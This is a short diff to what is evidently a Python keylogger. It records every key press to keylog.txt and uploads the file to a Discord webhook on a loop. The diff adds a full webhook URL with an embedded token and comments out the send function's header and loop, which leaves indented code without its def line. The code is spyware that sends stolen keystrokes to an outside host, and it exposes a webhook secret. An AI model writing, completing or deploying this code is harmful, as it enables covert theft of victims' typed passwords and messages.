@@ -4,7 +4,7 @@ from dhooks import Webhook
 #import json
 import time
 
-hook = Webhook ("https://discord.com/api/webhooks/")
+hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")
 #rdm_sec = [500,600,700,800,900]
 
 # This function runs every time a key is pressed
@@ -30,7 +30,7 @@ with keyboard.Listener(on_press=on_press) as listener:
 
 
 #send content of file function
-def send_file():
+#def send_file():
     with open("keylog.txt", "r") as file:
         content = file.read()
 
@@ -58,9 +58,9 @@ def send_file():
 
 
 #--execute send_file function here
-while True:
-    send_file()
-    time.sleep(100)  # 300 sec. 5 minutes
+#while True:
+#    send_file()
+#    time.sleep(100)  # 300 sec. 5 minutes
 
 
 
